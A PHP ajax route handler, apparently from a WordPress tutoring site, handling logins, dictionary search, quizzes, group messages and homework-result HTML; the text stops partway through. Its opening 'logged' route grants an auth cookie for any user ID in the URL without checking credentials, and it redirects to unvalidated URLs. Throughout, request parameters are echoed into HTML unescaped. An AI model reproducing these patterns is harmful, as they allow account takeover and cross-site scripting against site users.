<?php
$route = get_route();
if(isset($route[1]) && $route[1] == 'logged'){
    $userid = isset($route[2])?$route[2]:'';
    $session_id = isset($route[3])?$route[3]:'';
    $return_url = isset($route[4])?$route[4]:'';
    $user = get_user_by('ID', $userid);
    $userLogin = $user->user_login;
    wp_set_current_user($userid, $userLogin);
    wp_set_auth_cookie($userid);
    do_action('wp_login', $userid);
    if($return_url != ''){
        $return = str_replace(array(',',';'),array('/','?'),$return_url); 
        wp_redirect($return);
    }else{
        wp_redirect( 'https://iktutor.com/iklearn/en/?r=profile');
        
    }
    exit();
}
// make sure any ajax call to this script receive status 200
header('HTTP/1.1 200 OK');

if (!isset($route[1])) :
    ?>
    <!DOCTYPE html>
    <html><head></head></html>
<?php endif ?>
<?php
global $wpdb;
$task = $route[1];
if (isset($route[2])) {
    $do = $route[2];
}

/*
 * ajax search for dictionary
 */
if($task == "status_login"){
    $status_login = get_user_meta($user->ID, 'status_login', true);
    $status_login = $_REQUEST['status_login'];
    $current_user = wp_get_current_user();
    update_user_meta($current_user->ID, 'status_login', '0');

}
if ($task == 'get_status_login') {

    $current_user = wp_get_current_user();
    $status_login_2 = get_user_meta($current_user->ID, 'status_login_2', true);
    if($status_login_2 == '0'){
        echo $status_login_2;
    }else echo $status_login_2;

}
if ($task == 'dictionary') {
    $d = $_GET['d'];
    $dict_table = get_dictionary_table($d);

    $words = $wpdb->get_results($wpdb->prepare(
                    'SELECT DISTINCT entry FROM ' . $wpdb->prefix . $dict_table . ' WHERE entry LIKE %s LIMIT 0, 8', array($_GET['w'] . '%')
    ));

    // user might input inflected form. Try to get original form
    if (empty($words)) {
        $search = $wpdb->get_row($wpdb->prepare('SELECT DISTINCT entry FROM ' . $wpdb->prefix . $dict_table . ' WHERE REPLACE(inflection, \'*\', \'\') LIKE %s', array('%<if>' . $_GET['w'] . '</if>%')));
    }

    // research
    if (!is_null($search)) {
        $words = $wpdb->get_results($wpdb->prepare(
                        'SELECT DISTINCT entry FROM ' . $wpdb->prefix . $dict_table . ' WHERE entry LIKE %s LIMIT 0, 8', array($search->entry . '%')
        ));
    }

    if (!empty($words)) {
        foreach ($words as $word) {
            ?><a href="<?php echo locale_home_url() . '/?r=dictionary/' . $d . '/' . $word->entry ?>"><?php echo $word->entry ?></a><?php
        }
    } else {
        $words = $wpdb->get_results($wpdb->prepare(
                        'SELECT DISTINCT entry, levenshtein(entry, %s) AS lev FROM `wp_dict_elementary` WHERE entry LIKE %s ORDER BY lev LIMIT 8', array($_GET['w'], substr($_GET['w'], 0, 2) . '%')
        ));

        foreach ($words as $word) {
            ?><a href="<?php echo locale_home_url() . '/?r=dictionary/' . $d . '/' . $word->entry ?>"><?php echo $word->entry ?></a><?php
        }
    }

    exit;
}

/*
 * return a random quiz
 */
if ($task == 'randomquiz') {
    $dictionary = $_GET['d'];
    $sheet_category = $_GET['c'];

    echo json_encode(MWDB::random_quiz($dictionary, $sheet_category));

    die;
}

/**
 * get group message 
 */
if ($task == 'groupmessage') {
    $data = array(
        'group_id' => $_REQUEST['group_id'],
        'posted_by' => get_current_user_id(),
        'message' => $_REQUEST['message'],
        'posted_on' => $_REQUEST['date']
    );

    MWDB::insert_group_message($data);
    $group_id = $_GET['group_id'];
    $messages = MWDB::get_group_messages($group_id);
    echo json_encode($messages);
    die;
}
/**
 * get group message 
 */
if ($task == 'get_result_hw') {
    $id = $_REQUEST['hw_id'];
    $homework_result = MWDB::get_homework_results($id);
    echo json_encode($homework_result);
    die;
}
/**
 * leave group
 */
if ($task == 'leave_group') {
    $id = $_REQUEST['id_group'];
    $result = MWDB::leave_group($id);

    echo $result;
    die;
}

/**
 * get group message 
 */
if ($task == 'view_result_non_writing') {
    $id = $_REQUEST['hw_id'];
    $id_g = $_REQUEST['id_g'];
    $mode = $_REQUEST['mode'];
    // get Name 
    $homework_assignment = MWDB::get_homework_assignment_by_id($id);
    $sheet_id = $homework_assignment->sheet_id;
    $homework = MWDB::get_math_sheet_by_id($sheet_id);
    $questions = json_decode($homework->questions, true);
    $result_type = $homework->assignment_id;
    $name = MWDB::get_name_user($id);
    if ($homework_assignment->for_practice == 1) {
        $result = MWDB::get_result_worksheet_practive($id, $id_g);
    } else {
        $result = MWDB::get_result_worksheet_homework($id);
    }
    $question = json_decode($result->questions);
    $answer = json_decode($result->answers);
    $user_avatar = ik_get_user_avatar($homework_result[0]->graded_by);

    $html = '';
    $html .= '<span class="css-name-sheet">' . $questions['question'] . '</span>';
    $html .= '<div style="padding: 1% 5% 1% 5%;">';
    if (!empty($user_avatar)) :
        $html .= '<img src="' . $user_avatar . '" width="130" height="140" alt="" class="css-image-user-load-db">';
    else :
        $html .= '<div class="css-image-user"></div>';
    endif;
    $html .= '<div class="result-info">';
    $html .= '<div><span class="css-7D7D7D">' . "Teacher: " . '</span>';
    $html .= '<span class="css-7C7C7C">' . "N/A" . '</span></div>';
    $html .= '<div><span class="css-7D7D7D">' . "Student's Name: " . '</span>';
    $html .= '<span class="css-7C7C7C">' . $name->user_nicename . '</span></div>';
    $html .= '<div><span class="css-7D7D7D">' . "Level: " . '</span>';
    $html .= '<span class="css-7C7C7C">' . $result->lv . '</span></div>';
    $html .= '<div><span class="css-7D7D7D">' . "Dictionary: " . '</span>';
    if ($result->libname == '') {
        $html .= '<span class="css-7C7C7C">' . "N/A" . '</span>';
    } else {
        $html .= '<span class="css-7C7C7C">' . $result->libname . '</span>';
    }
    $html .= '</div>';
    $html .= '<div><span class="css-7D7D7D">' . "Last Attempt: " . '</span>';
    $html .= '<span class="css-7C7C7C">' . $name->attempted_on . '</span></div>';

    $html .= '<div class="css-mobile-display">';
    $html .= '<div style="width:84%"><span class="css-7D7D7D">' . "Completed Date: " . '</span>';
    $html .= '<span class="css-7C7C7C">' . $name->submitted_on . '</span></div>';
    $html .= '<div class="css-mobile-right txt-score"><span class="css-rs-score" style="color: #909090;">' . "Score: " . '</span>';
    if ($result->score == 100) {
        $html .= '<span class="rs-score1" style="color: #657d00;">100%</span></div>';
    } else if ($result->score == null) {
        $html .= '<span class="rs-score1" style="color: #cd003d;">0%</span></div>';
    } else {
        $html .= '<span class="rs-score1" style="color: #cd003d;">' . $result->score . '%</span></div>';
    }
    $html .= '</div>';

    $html .= '</div>';

    $html .= '<div class="line-result"></div>';
//    foreach load table question
    $html .= '<div style="width: 100%">';
// table    
    $html .= '<table class="table table-striped table-condensed ik-table1 scroll-fix-head1 vertical-middle" id="homeworkcritical">';
//thread    
    $html .= '<thead class="homeworkcritical" style="background: #fff;">';
    $html .= '<tr style="background: #fff;">';
    $html .= '<th class="text-color-custom-1 css-th2-question" style="color: #00a6bc !important;">CORRECT ANSWER</th>';
    $html .= '<th class=" text-color-custom-1 css-th3-question" style="width: 18% !important;color: #909090 !important;">YOUR ANSWER</th>';
    $html .= '<th class="" style="width: 20% !important" ></th>';
    $html .= '</tr>';
    $html .= '</thead>';
    // Get những câu trả lời
    if ($mode == '0') {
        $data_answer = MWDB::get_answer_test_mode($id);
    } else {
        $data_answer = MWDB::get_answer_practive($id);
    }
    // Get đáp án
    $data_question = MWDB::get_question_sheet($sheet_id);
    $string_answer_correct = json_decode($data_question->questions);
    // Nếu không có câu trả lời
    if ($result_type == 7 || $result_type == 8) {
        $obj_step = $string_answer_correct->step;
        $arr_answer_correct = (array) $obj_step;   // array những đáp án có dạng s1=>1,s2=>2
        // Xử lý khi khôngg có đáp án
        if (count($arr_answer_correct) == 3) {
            $html .= '<tbody style="height:119px !important";>';
        } else {
            $html .= '<tbody style="height:250px !important";>';
        }
        if (empty($data_answer->answers)) {
            foreach ($arr_answer_correct as $key => $value) {
                $split = str_split($value);
                $anw = '';
                for ($i = 0; $i < count($split); $i++) {
                    if ($split[$i] != '@') {
                        $anw .= $split[$i] . ',';
                    }
                }
                $anw = rtrim($anw, ",");
                $html .= '<tr>';
                $html .= '<td class="row-full-1 padding-left-3" style="width:50%! important;color: #007382 !important;">' . $anw . '</td>';
                $html .= '<td class="row-full-1 css-url-ic" style="width:1%! important;"></td>';
                $html .= '<td class="row-full-1 td-answer" style="width:48%! important;padding-left: 2% !important;"></td>';
                $html .= '</tr>';
            }
        } else {
            $arr_answer = json_decode($data_answer->answers, true);
            $arr_an = [];
            end($arr_answer);
            $key = key($arr_answer);
            $b = explode('[', $key); // 's3]'
            $c = explode(']', $b[1]);
            $d = $c[0];
            $e = (int) (ltrim($d, "s"));   // chiều dài cần for
            for ($i = 1; $i <= $e; $i++) {
                $q = '';
                foreach ($arr_answer as $key => $value) {
                    if (strpos($key, '[s' . $i . ']')) {
                        if ($value != '') {
                            $q .= $value . ',';
                        } else {
                            $q .= " " . ',';
                        }
                    }
                }
                $q = rtrim($q, ",");
                array_push($arr_an, $q);
            }
//                    var_dump($arr_an);die;
            foreach ($arr_answer_correct as $key => $value) {
                $num = (int) (ltrim($key, "s"));
                $stt = $num - 1;
                $an_answer = $arr_an[$stt];
//                        var_dump($arr_an);die;
                $split = str_split($value);
                $anw = '';
                for ($i = 0; $i < count($split); $i++) {
                    if ($split[$i] != '@') {
                        $anw .= $split[$i] . ',';
                    }
                }
                $anw = rtrim($anw, ",");
                $html .= '<tr>';
                $html .= '<td class="row-full-1 padding-left-3" style="width:50%! important;color: #007382 !important;">' . $anw . '</td>';
                $html .= '<td class="row-full-1 css-url-ic" style="width:1%! important;"></td>';
                $html .= '<td class="row-full-1 td-answer" style="width:48%! important;padding-left: 2% !important;">' . $an_answer . '</td>';
                $html .= '</tr>';
            }
        }
    } else if ($result_type == 9 || $result_type == 10) {
        $object = ($string_answer_correct->step);
        end($object);
        // get the key
        $key_last = key($object);
        $obj_step = $string_answer_correct->step;
        $arr_answer_correct = (array) $obj_step;   // array những đáp án có dạng s1=>1,s2=>2
        // Xử lý khi khôngg có đáp án
        if (count($arr_answer_correct) == 3) {
            $html .= '<tbody style="height:119px !important";>';
        } else {
            $html .= '<tbody style="height:250px !important";>';
        }

        $popped = array_pop($arr_answer_correct);
        $ar[$key_last] = $popped;
        $arr_answer_correct = array_merge($ar, $arr_answer_correct);
//                    var_dump($arr_answer_correct);die;
        if (empty($data_answer->answers)) {
            foreach ($arr_answer_correct as $key => $value) {
                $split = str_split($value);
                $anw = '';
                for ($i = 0; $i < count($split); $i++) {
                    if ($split[$i] != '@') {
                        $anw .= $split[$i] . ',';
                    }
                }
                $anw = rtrim($anw, ",");
                $html .= '<tr>';
                $html .= '<td class="row-full-1 padding-left-3" style="width:50%! important;color: #007382 !important;">' . $anw . '</td>';
                $html .= '<td class="row-full-1 css-url-ic" style="width:1%! important;"></td>';
                $html .= '<td class="row-full-1 td-answer" style="width:48%! important;padding-left: 2% !important;"></td>';
                $html .= '</tr>';
            }
        }
        //
        else {
            $arr_answer = json_decode($data_answer->answers, true);
            $arr_an = [];
            reset($arr_answer);
            $first_key = key($arr_answer);
            $b = explode('[', $first_key); // 's3]'
            $c = explode(']', $b[1]);
            $d = $c[0];
            $e = (int) (ltrim($d, "s"));
            for ($i = 1; $i <= $e; $i++) {
                $q = '';
                foreach ($arr_answer as $key => $value) {
                    if (strpos($key, '[s' . $i . ']')) {
                        if ($value != "") {
                            $q .= $value . ',';
                        } else {
                            $q .= " " . ',';
                        }
                    }
                }
                $q = rtrim($q, ",");
                array_push($arr_an, $q);
            }
//                    var_dump($arr_an);die;
            foreach ($arr_answer_correct as $key => $value) {
                $num = (int) (ltrim($key, "s"));
                $stt = $num - 1;
                $an_answer = $arr_an[$stt];
//                            var_dump($arr_an);die;
                $split = str_split($value);
                $anw = '';
                for ($i = 0; $i < count($split); $i++) {
                    if ($split[$i] != '@') {
                        $anw .= $split[$i] . ',';
                    }
                }
                $anw = rtrim($anw, ",");
                $html .= '<tr>';
                $html .= '<td class="row-full-1 padding-left-3" style="width:50%! important;color: #007382 !important;">' . $anw . '</td>';
                $html .= '<td class="row-full-1 css-url-ic" style="width:1%! important;"></td>';
                $html .= '<td class="row-full-1 td-answer" style="width:48%! important;padding-left: 2% !important;">' . $an_answer . '</td>';
                $html .= '</tr>';
            }
        }
    } else if ($result_type == 11 || $result_type == 15) {
        $object = ($string_answer_correct->q);
        $total = count((array) $object);
        $arr_answer = explode(",", $data_answer->answers);
        if ($total <= 3) {
            $html .= '<tbody style="height:119px !important";>';
        } else {
            $html .= '<tbody style="height:250px !important";>';
        }
        for ($i = 0; $i < $total; $i++) {
            $j = (int) $i + 1;
            $k = 'q' . $j;
            $html .= '<tr>';
            $html .= '<td class="row-full-1 padding-left-3" style="width:50%! important;color: #007382 !important;">' . $object->$k->answer . '</td>';
            $html .= '<td class="row-full-1 css-url-ic" style="width:1%! important;"></td>';
            $html .= '<td class="row-full-1 td-answer" style="width:48%! important;padding-left: 2% !important;">' . $arr_answer[$i] . '</td>';
            $html .= '</tr>';
        }
    } else if ($result_type == 12) {
        $object = ($string_answer_correct->q);
        $total = count((array) $object);
        $arr_answer = explode(",", $data_answer->answers);
        if ($total <= 3) {
            $html .= '<tbody style="height:119px !important";>';
        } else {
            $html .= '<tbody style="height:250px !important";>';
        }
        for ($i = 0; $i < $total; $i++) {
            $j = (int) $i + 1;
            $k = 'q' . $j;
            $html .= '<tr>';
            $html .= '<td class="row-full-1 padding-left-3" style="width:50%! important;color: #007382 !important;">' . $object->$k->answer . '</td>';
            $html .= '<td class="row-full-1 css-url-ic" style="width:1%! important;"></td>';
            $html .= '<td class="row-full-1 td-answer" style="width:48%! important;padding-left: 2% !important;">' . $arr_answer[$i] . '</td>';
            $html .= '</tr>';
        }
    } else if ($result_type == 13) {
        $answer_correct = ($string_answer_correct->answer);  // đáp án
        if ($answer_correct == "no answer") {
            $answer_correct = "N/A";
        }
        $html .= '<tbody style="height:119px !important";>';
        $html .= '<tr>';
        $html .= '<td class="row-full-1 padding-left-3" style="width:50%! important;color: #007382 !important;">' . $answer_correct . '</td>';
        $html .= '<td class="row-full-1 css-url-ic" style="width:1%! important;"></td>';
        $html .= '<td class="row-full-1 td-answer" style="width:48%! important;padding-left: 2% !important;">' . $data_answer->answers . '</td>';
        $html .= '</tr>';
    } else if ($result_type == 14) {
        $object = ($string_answer_correct->q);
        $total = count((array) $object);
        $str_correct_answer = ''; // String đáp án
        for ($i = 1; $i <= $total; $i++) {
            $key = 'q' . $i;
            if ($object->$key->answer == '') {
                $num = $i - 1; // Số cần for
                break;
            } else {
                $str_correct_answer .= $object->$key->answer . ',';
            }
        }
        $str_correct_answer = rtrim($str_correct_answer, ",");
        $html .= '<tbody style="height:119px !important";>';
        $html .= '<tr>';
        $html .= '<td class="row-full-1 padding-left-3" style="width:50%! important;color: #007382 !important;">' . $str_correct_answer . '</td>';
        $html .= '<td class="row-full-1 css-url-ic" style="width:1%! important;"></td>';
        $html .= '<td class="row-full-1 td-answer" style="width:48%! important;padding-left: 2% !important;">' . $data_answer->answers . '</td>';
        $html .= '</tr>';
    }

    $html .= '</tbody>';
// end table        
    $html .= '</table>';
    $html .= '</div>';
    $html .= '<input type="button" value="Preview Worksheet" class="css-btn-priview" id="preview-btn-math" data_id="' . $homework->id . '">';
    $html .= '<div class="line-result"></div>';
    echo $html;
    die;
}
// Load data when click button priview Worksheet
if ($task == "load_info_worksheet") {
    $sid = $_REQUEST['sid'];
    $homework = MWDB::get_math_sheet_by_id($sid);
    echo json_encode($homework);
    die;
}

if ($task == "load_working_worksheet") {
    $sid = $_REQUEST['sid'];
    if (isset($_REQUEST['ismode'])) {
        $ismode = $_REQUEST['ismode'];
    } else {
        $ismode = 1;
    }
//    var_dump($ismode);
    $homework = MWDB::get_math_sheet_by_id($sid);
    $questions = json_decode($homework->questions, true);
    $curr_mode = empty($_GET['mode']) ? 'practice' : $_GET['mode'];
    $gidlink = esc_html(base64_decode(rawurldecode($_GET['ref'])));
    $gidsub = strstr($gidlink, 'gid=');
    $getgroup_id = substr($gidsub, 4);
    $checkdisplay = MWDB::get_display_last_page($sheet_id, $getgroup_id);
    if ($checkdisplay != null) {
        $admindp = $checkdisplay->adminlastpage;
        $teacherdp = $checkdisplay->teacherlastpage;
    } else {
        $admindp = 2;
        $teacherdp = 2;
    }

    $layout = isset($_GET['layout']) ? $_GET['layout'] : '';
    $cid = isset($_GET['cid']) && is_numeric($_GET['cid']) ? $_GET['cid'] : 0;
    $task = isset($_POST['task']) ? $_POST['task'] : '';
    $check_global = 0;      // biến để kiểm tra nếu Assignment and Grade is checked hiển thị cột Ordering   
    $route = get_route();
    if (empty($route[1])) {
        $active_tab = 'english';
    } else {
        $active_tab = $route[1];
    }
    $html .= '<div class="col-sm-12 homework-user-answer ans-working-worksheet" style="border-right: 0 solid #F5F0A3; !important;z-index: 1">';
    $html .= '<div id="math-level-mb" class="css-font-helvetica-regular css-head-ws1 css-only-show-mb css-mb-head-ws" style="padding-left:15px"></div>';
    $html .= '<div class="hr-shadow hr-mb-working-ws-mb css-only-show-mb"></div>';
    $html .= '<div id="" class="hidden css-anwer-correct css-only-show-mb txt-answer-correct-last">';
    $html .= '</div>';
    $html .= '<div class="col-sm-2 css-only-show-mb css-mar-mb-an" style="float: right">';
    $html .= '<span id="" class="hidden css-close-an-correct ic-close-an-correct"></span>';
    $html .= '</div>';
    $html .= '<div class="row css-answer-mb">';
    $html .= '<div class="col-xs-10 css-div-answer-working-ws">';
    $ass_id = $homework->assignment_id;
    if ($ass_id == 7 || $ass_id == 8 || $ass_id == 9 || $ass_id == 10 || $ass_id == 11 || $ass_id == 15 || $ass_id == 12) {
        $html .= '<input type="text" placeholder="Type Anwer Here ..." class="invisible css-mobile-input-answer homework-input tooltip-top-left css-ans-ws color-black" name="result" id="input-answer" data-answer="' . $questions['answer'] . '" data-correct="' . 'Correct!' . '" data-incorrect="' . 'Incorrect!' . '">';
    } else {
        $html .= '<input type="text" placeholder="Type Anwer Here ..." class="css-mobile-input-answer homework-input tooltip-top-left css-ans-ws color-black" name="result" id="input-answer" data-answer="' . $questions['answer'] . '" data-correct="' . 'Correct!' . '" data-incorrect="' . 'Incorrect!' . '">';
    }
    $html .= '</div>';
    $html .= '<div class="col-xs-2 padding-left-42 css-mob-lef-24 none-icon-next-mb" style="position: absolute;right: 0;">';
    if (!$teacher_taking_test) {
        $_ref_url = empty($_GET['ref']) ? "#" : esc_html(base64_decode(rawurldecode($_GET['ref'])));
    } else {
        $_ref_url = locale_home_url() . "/?r=teaching/tutor-math";
    }
    if (!empty($homework_assignment->next_homework_id)) {
        $_next_url = locale_home_url() . '/?r=math-homework';
        if ($curr_mode == 'homework' || $is_next_homework != '1') {
            $_next_url .= '&amp;mode=homework';
        }
        $_next_url .= '&amp;hid=' . $homework_assignment->next_homework_id;
        $_next_url = empty($_GET['ref']) ? $_next_url : $_next_url . '&amp;ref=' . $_GET['ref'];
    } else {
        $_next_url = $_ref_url;
    }
    if (isset($_GET['id_parent'])) {
        $id = $_GET['id_parent'];
    }
    if ($homework_assignment->for_practice == 1) {
        if (!empty($_GET["sat"])) {
            if (!empty($homework_assignment->next_homework_id)) {
                $link = $_next_url . '&prid=' . $id . "&ismode=" . $homework_assignment->for_practice . "&sat=" . $_GET["sat"] . "&gid=" . $_GET["gid"];
            } else {
                $link = home_url() . "/?r=online-learning&sat=" . $_GET["sat"] . "&gid=" . $_GET["gid"];
            }
        } else if (!empty($_GET["page-back"])) {
            if (!empty($homework_assignment->next_homework_id)) {
                $link = $_next_url . '&prid=' . $id . "&ismode=" . $homework_assignment->for_practice . "&sat=" . $_GET["sat"] . "&gid=" . $_GET["gid"] . "&page-back=" . $_GET["page-back"];
            } else {
                $link = home_url() . "/?r=sat-preparation/" . $_GET["page-back"] . "&client=math-emathk";
            }
        } else if (!empty($_GET["back-ikmath"])) {
            if (!empty($homework_assignment->next_homework_id)) {
                $link = $_next_url . '&prid=' . $id . "&ismode=" . $homework_assignment->for_practice . '&amp;back-ikmath=' . $_GET["back-ikmath"] . "&gid=" . $_GET["gid"];
            } else {
                $link = home_url() . "/?r=online-learning&back-ikmath=" . $_GET["back-ikmath"] . "&gid=" . $_GET["gid"] . "&issat-math=1";
            }
        } else if (!empty($_GET["lvid"])) {
            if (!empty($homework_assignment->next_homework_id)) {
                $link = $_next_url . '&prid=' . $id . "&ismode=" . $homework_assignment->for_practice . '&amp;back-ikmath=' . $_GET["back-ikmath"] . "&lvid=" . $_GET["lvid"] . "&gid=" . $_GET["gid"];
            } else {
                $link = home_url() . "/?r=online-learning&math&lvid=" . $_GET["lvid"];
            }
        } else {
            $link = $_next_url . '&prid=' . $id . "&ismode=" . $homework_assignment->for_practice;
        }
        $html .= '<button type="submit" name="submit-practive" id="btn-next-practive" class="btn brown btn-next-practive color-9d9d9d" data-loading-text="' . 'Submitting...' . '" data-ref="' . $link . '"></span>' . 'Next' . '</button>';
        $html .= '<input type="hidden" name="ref-practive" id="input-ref-practive" value="' . $link . '">';
    } else {
        if (!empty($_GET["sat"])) {
            if (!empty($homework_assignment->next_homework_id)) {
//                $html .='<a href="'. $_next_url.'&prid='.$id."&ismode=".$homework_assignment->for_practice ."&sat=".$_GET["sat"]."&gid=".$_GET["gid"].'" class="css-text-next-worksheet color-9d9d9d" id="next-worksheet" style="background: #fff !important;">'.'Next'.'</a>';
                $html .= '<span class="ic-main-btn"><span class="ic-pen-new"></span></span>';
                if ($ismode == 1) {
                    $html .= '<input type="button" name="answer-homework" value="Answer" class="ic-submit-btn css-btn-sub btn-answer" style="border:none">';
                } else {
                    $html .= '<input type="button" name="submit-homework" value="Submit" class="ic-submit-btn css-btn-sub btn-submit" style="border:none">';
                }
                $html .= '<span class="image-surround css-img-round" style="">';
                $html .= '<a href="' . $_next_url . '&prid=' . $id . "&ismode=" . $homework_assignment->for_practice . "&sat=" . $_GET["sat"] . "&gid=" . $_GET["gid"] . '" class="css-text-next-worksheet" id="next-worksheet" style="color: #A0A0A0 !important;background: #fff !important;">' . 'Next' . '</a>';
                $html .= '<span class="ic-close-main ic-close-main-new">';
                $html .= '</span>';
            } else {

                $html .= '<span class="ic-main-btn"><span class="ic-pen-new"></span></span>';
                if ($ismode == 1) {
                    $html .= '<input type="button" name="answer-homework" value="Answer" class="ic-submit-btn css-btn-sub btn-answer" style="border:none">';
                } else {
                    $html .= '<input type="button" name="submit-homework" value="Submit" class="ic-submit-btn css-btn-sub btn-submit" style="border:none">';
                }
                $html .= '<span class="image-surround css-img-round" style="">';
                $html .= '<a href="' . $_next_url . '&prid=' . $id . "&ismode=" . $homework_assignment->for_practice . "&sat=" . $_GET["sat"] . "&gid=" . $_GET["gid"] . '" class="css-text-next-worksheet" id="next-worksheet" style="color: #A0A0A0 !important;background: #fff !important;">' . 'Next' . '</a>';
                $html .= '<span class="ic-close-main ic-close-main-new">';
                $html .= '</span>';
            }
        } else if (!empty($_GET["page-back"])) {
            if (!empty($homework_assignment->next_homework_id)) {
//                $html .='<a href="'. $_next_url.'&prid='.$id."&ismode=".$homework_assignment->for_practice ."&sat=".$_GET["sat"]."&gid=".$_GET["gid"]."&page-back=".$_GET["page-back"].'" class="css-text-next-worksheet color-9d9d9d" id="next-worksheet" style="background: #fff !important;">'.'Next'.'</a>';
                $html .= '<span class="ic-main-btn"><span class="ic-pen-new"></span></span>';
                if ($ismode == 1) {
                    $html .= '<input type="button" name="answer-homework" value="Answer" class="ic-submit-btn css-btn-sub btn-answer" style="border:none">';
                } else {
                    $html .= '<input type="button" name="submit-homework" value="Submit" class="ic-submit-btn css-btn-sub btn-submit" style="border:none">';
                }
                $html .= '<span class="image-surround css-img-round" style="">';
                $html .= '<a href="' . $_next_url . '&prid=' . $id . "&ismode=" . $homework_assignment->for_practice . "&sat=" . $_GET["sat"] . "&gid=" . $_GET["gid"] . '" class="css-text-next-worksheet" id="next-worksheet" style="color: #A0A0A0 !important;background: #fff !important;">' . 'Next' . '</a>';
                $html .= '<span class="ic-close-main ic-close-main-new">';
                $html .= '</span>';
            } else {
//                $html .='<a href="'.home_url()."/?r=sat-preparation/".$_GET["page-back"]."&client=math-emathk".'" class="css-text-next-worksheet color-9d9d9d" id="next-worksheet" style="background: #fff !important;">'.'Next'.'</a>';
                $html .= '<span class="ic-main-btn"><span class="ic-pen-new"></span></span>';
                if ($ismode == 1) {
                    $html .= '<input type="button" name="answer-homework" value="Answer" class="ic-submit-btn css-btn-sub btn-answer" style="border:none">';
                } else {
                    $html .= '<input type="button" name="submit-homework" value="Submit" class="ic-submit-btn css-btn-sub btn-submit" style=";border:none">';
                }
                $html .= '<span class="image-surround css-img-round" style="">';
                $html .= '<a href="' . $_next_url . '&prid=' . $id . "&ismode=" . $homework_assignment->for_practice . "&sat=" . $_GET["sat"] . "&gid=" . $_GET["gid"] . '" class="css-text-next-worksheet" id="next-worksheet" style="color: #A0A0A0 !important;background: #fff !important;">' . 'Next' . '</a>';
                $html .= '<span class="ic-close-main ic-close-main-new">';
                $html .= '</span>';
            }
        } else if (!empty($_GET["back-ikmath"])) {
            if (!empty($homework_assignment->next_homework_id)) {
//                $html .='<a href="'.$_next_url.'&prid='.$id."&ismode=".$homework_assignment->for_practice .'&amp;back-ikmath='.$_GET["back-ikmath"]."&gid=".$_GET["gid"].'" class="css-text-next-worksheet color-9d9d9d" id="next-worksheet" style="background: #fff !important;">'.'Next'.'</a>';
                $html .= '<span class="ic-main-btn"><span class="ic-pen-new"></span></span>';
                if ($ismode == 1) {
                    $html .= '<input type="button" name="answer-homework" value="Answer" class="ic-submit-btn css-btn-sub btn-answer" style="border:none">';
                } else {
                    $html .= '<input type="button" name="submit-homework" value="Submit" class="ic-submit-btn css-btn-sub btn-submit" style="border:none">';
                }
                $html .= '<span class="image-surround css-img-round" style="">';
                $html .= '<a href="' . $_next_url . '&prid=' . $id . "&ismode=" . $homework_assignment->for_practice . "&sat=" . $_GET["sat"] . "&gid=" . $_GET["gid"] . '" class="css-text-next-worksheet" id="next-worksheet" style="color: #A0A0A0 !important;background: #fff !important;">' . 'Next' . '</a>';
                $html .= '<span class="ic-close-main ic-close-main-new">';
                $html .= '</span>';
            } else {
//                $html .='<a href="'.home_url()."/?r=online-learning&back-ikmath=".$_GET["back-ikmath"]."&gid=".$_GET["gid"]."&issat-math=1".'" class="css-text-next-worksheet color-9d9d9d" id="next-worksheet" style="background: #fff !important;">'.'Next'.'</a>';
                $html .= '<span class="ic-main-btn"><span class="ic-pen-new"></span></span>';
                if ($ismode == 1) {
                    $html .= '<input type="button" name="answer-homework" value="Answer" class="ic-submit-btn css-btn-sub btn-answer" style="border:none">';
                } else {
                    $html .= '<input type="button" name="submit-homework" value="Submit" class="ic-submit-btn css-btn-sub btn-submit" style="border:none">';
                }
                $html .= '<span class="image-surround css-img-round" style="">';
                $html .= '<a href="' . $_next_url . '&prid=' . $id . "&ismode=" . $homework_assignment->for_practice . "&sat=" . $_GET["sat"] . "&gid=" . $_GET["gid"] . '" class="css-text-next-worksheet" id="next-worksheet" style="color: #A0A0A0 !important;background: #fff !important;">' . 'Next' . '</a>';
                $html .= '<span class="ic-close-main ic-close-main-new">';
                $html .= '</span>';
            }
        } else {
//            $html .='<a href="'. $_next_url.'&prid='.$id."&ismode=".$homework_assignment->for_practice .'" class="css-text-next-worksheet color-9d9d9d" id="next-worksheet" style="background: #fff !important;" >'.'Next'.'</a>';
            $html .= '<span class="ic-main-btn"><span class="ic-pen-new"></span></span>';
            if ($ismode == 1) {
                $html .= '<input type="button" name="answer-homework" value="Answer" class="ic-submit-btn css-btn-sub btn-answer" style="border:none">';
            } else {
                $html .= '<input type="button" name="submit-homework" value="Submit" class="ic-submit-btn css-btn-sub btn-submit" style="border:none">';
            }
            $html .= '<span class="image-surround css-img-round" style="">';
            $html .= '<a href="' . $_next_url . '&prid=' . $id . "&ismode=" . $homework_assignment->for_practice . "&sat=" . $_GET["sat"] . "&gid=" . $_GET["gid"] . '" class="css-text-next-worksheet" id="next-worksheet" style="color: #A0A0A0 !important;background: #fff !important;">' . 'Next' . '</a>';
            $html .= '<span class="ic-close-main ic-close-main-new">';
            $html .= '</span>';
        }
    }
    $html .= '</div>';
    $html .= '</div>';
    $html .= '</div>';
    //end section answer
    $html .= '<div class="modal-header col-xs-9 col-sm-10 article-header math-homework-header css-head-preview-modal">';
    $html .= '<span style="right: 2% !important;padding-top: 3%;" class="close close-dialog hidden-modal-preview"></span>';
    $html .= '<h4 class="page-subtitle css-title-modal1">' . $homework->level_category_name . '</h4>';
    $html .= '<h2 class="page-title arithmetics css-title-modal2" itemprop="headline" >' . $homework->level_name . ', ' . $homework->sublevel_name . '</h2>';
    $html .= '<p class="math-question css-title-modal3">' . $questions['question'] . '</p>';
    $html .= '</div>';
    $html .= '<div class="modal-body green" style="padding: 0px">';
    $html .= '<div class="col-xs-12 math-homework-body css-pad0">';

    $html .= '<div class="row">';
//    $html .= '<form id="main-form" method="post" action="">';
    //Section Menu
    $html .= '<div id="menu-notepad" class="menu-notepad">';
    $html .= '<div id="close-menu" class="close-menu"><img src="' . site_url() . '/wp-content/themes/ik-learn/library/images/delete_white.png"></div>';
    $html .= '<div class="block-menu"><img src="' . site_url() . '/wp-content/themes/ik-learn/library/images/Pencil.png" class="icon-block">';
    $html .= '<div class="custom-radios radio-pencil">';
    $html .= '<div>';
    $html .= '<input id="pencil-1" name="pencil" value="1" checked="" type="radio">';
    $html .= '<label for="pencil-1">';
    $html .= '<span><hr></span>';
    $html .= '</label>';
    $html .= '</div>';

    $html .= '<div>';
    $html .= '<input id="pencil-2" name="pencil" value="2" type="radio">';
    $html .= '<label for="pencil-2">';
    $html .= '<span><hr></span>';
    $html .= '</label>';
    $html .= '</div>';

    $html .= '<div>';
    $html .= '<input id="pencil-3" name="pencil" value="3" type="radio">';
    $html .= '<label for="pencil-3">';
    $html .= '<span><hr></span>';
    $html .= '</label>';
    $html .= '</div>';

